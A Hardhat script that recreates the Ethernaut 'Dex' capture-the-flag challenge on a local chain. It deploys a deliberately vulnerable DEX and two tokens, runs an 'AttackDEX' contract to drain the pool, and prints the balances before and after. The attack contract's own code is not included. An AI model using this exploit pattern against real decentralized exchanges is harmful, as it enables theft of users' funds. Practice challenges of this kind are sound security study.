/*

*/

const hre = require("hardhat");
const { expect } = require("chai")

async function main() {
  // Recreating the attack on ganache
  [player,deployer,user] = await ethers.getSigners();
  
  // Fund the player account - Execute it only the first time the script is ran
  await user.sendTransaction({
    to: player.address,
    value: ethers.utils.parseEther("50.0"), // Sends exactly 50.0 ether
  });

  // Get an instance of the contract deployed by Ethernaut
  // const GatekeeperTwo = "0xEe5097bF657e8aFDD0d7bF0f8580cfB2C6d777cF"
  // this.gateKeeperTwo = await hre.ethers.getContractAt("GatekeeperTwo",GatekeeperTwo);

  console.log("Deploying DEX & Tokens Contract");
  // Deploying a new DEX contract
  const Dex = await hre.ethers.getContractFactory("Dex");
  this.dex = await Dex.connect(deployer).deploy();
  await this.dex.deployed();

  // Deploying Token1 contract
  const Token1 = await hre.ethers.getContractFactory("SwappableToken");
  this.token1 = await Token1.connect(deployer).deploy(this.dex.address,"Token1","T1",500);
  await this.token1.deployed();

  // Deploying Token2 contract
  const Token2 = await hre.ethers.getContractFactory("SwappableToken");
  this.token2 = await Token2.connect(deployer).deploy(this.dex.address,"Token2","T2",500);
  await this.token2.deployed();

  console.log("Setting up token's balances and required allowances");
  // Setting up the token's balances!
  // Token's owner grants the DEX contract the required allowance to add 100 tokens1 as liquidity
  let tx = await this.token1.connect(deployer).increaseAllowance(this.dex.address,100);
  await tx.wait();

  // Token's owner grants the DEX contract the required allowance to add 100 tokens2 as liquidity
  tx = await this.token2.connect(deployer).increaseAllowance(this.dex.address,100);
  await tx.wait();

  // Adding 100 tokens of each token as liquidity on the DEX Contract
  tx = await this.dex.connect(deployer).addLiquidity(this.token1.address,100);
  await tx.wait();
  tx = await this.dex.connect(deployer).addLiquidity(this.token2.address,100);
  await tx.wait();

  // Setting the tokens addresses on the DEX Contract
  tx = await this.dex.connect(deployer).setTokens(this.token1.address,this.token2.address);
  await tx.wait();
  
  // Granting allowance to the DEX Contract to spend tokens on behalf of the player
  tx = await this.token1.connect(player).increaseAllowance(this.dex.address,500);
  await tx.wait();

  tx = await this.token2.connect(player).increaseAllowance(this.dex.address,500);
  await tx.wait();


  // Validate all the configurations on the DEX Contract were made properly before proceeding to deploy the Attacker contract
  expect(await this.token1.address).to.eq(await this.dex.token1());
  expect(await this.token2.address).to.eq(await this.dex.token2());

  expect(await this.dex.balanceOf(this.token1.address,this.dex.address)).to.eq(100);
  expect(await this.dex.balanceOf(this.token2.address,this.dex.address)).to.eq(100);

  expect(await this.token1.allowance(player.address,this.dex.address)).to.eq(500);
  expect(await this.token2.allowance(player.address,this.dex.address)).to.eq(500);
  

  // console.log(
  //   `
  //   \n\n Deploying contracts ... \n
  //   DEX Contract ${await this.dex.address} \n
  //   Token1 Contract: ${await this.token1.address} \n
  //   Token2 Contract: ${await this.token2.address} \n \n
  //   Dex contract token1 balance: ${await this.dex.balanceOf(this.token1.address,this.dex.address)} \n
  //   Dex contract token2 balance: ${await this.dex.balanceOf(this.token2.address,this.dex.address)} \n

  //   Token1 set on DEX Contract: ${await this.dex.token1()} \n
  //   Token2 set on DEX Contract: ${await this.dex.token2()} \n
  //   `
  // );

  console.log("Deploying the AttackDEX Contract");
  // Deploying the AttackDEX contract
  const AttackDEX = await hre.ethers.getContractFactory("AttackDEX");
  this.attackDEX = await AttackDEX.connect(player).deploy(this.dex.address);
  await this.attackDEX.deployed();

  
  console.log("\n\n Performing attack ... \n");
  const attackTX = await this.attackDEX.connect(player).initiateAttack({gasLimit: 30000000});
  let attackTXResult = await attackTX.wait();
  console.log("attackTXResult " , attackTXResult);


  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    Dex contract token1 balance: ${await this.dex.balanceOf(this.token1.address,this.dex.address)} \n
    Dex contract token2 balance: ${await this.dex.balanceOf(this.token2.address,this.dex.address)} \n

    Player token1 balance: ${await this.dex.balanceOf(this.token1.address,player.address)} \n
    Player token2 balance: ${await this.dex.balanceOf(this.token2.address,player.address)} \n
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});